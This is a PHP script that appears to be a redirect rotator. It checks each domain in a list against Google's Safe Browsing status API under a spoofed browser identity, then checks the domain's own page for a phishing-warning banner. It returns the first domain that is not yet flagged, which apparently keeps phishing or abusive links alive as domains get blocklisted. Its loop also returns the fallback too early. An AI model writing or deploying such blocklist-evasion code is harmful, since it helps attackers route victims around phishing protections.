<?php
error_reporting(0);
include 'url.php';
function redirect($sites,$redirectUrlIfFlag){

for($i=0;$i<count($sites);$i++){
$input = $sites[$i];
$parse = parse_url($input);
$trim = $parse['host'];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=$trim");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
'referer: https://transparencyreport.google.com/safe-browsing/search?url=$trim',
'sec-ch-ua-mobile: ?0',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
 
$page = curl_exec($ch);
curl_close($ch);

if(preg_match('(1,0,0,0,0,0)',$page)){
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://$trim");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 
$page = curl_exec($ch);
curl_close($ch);
    
    if(preg_match('(This link has been flagged as phishing. We suggest you avoid it.)',$page)){continue;}else{return $input;}
    
}

return $redirectUrlIfFlag;
}
}
?>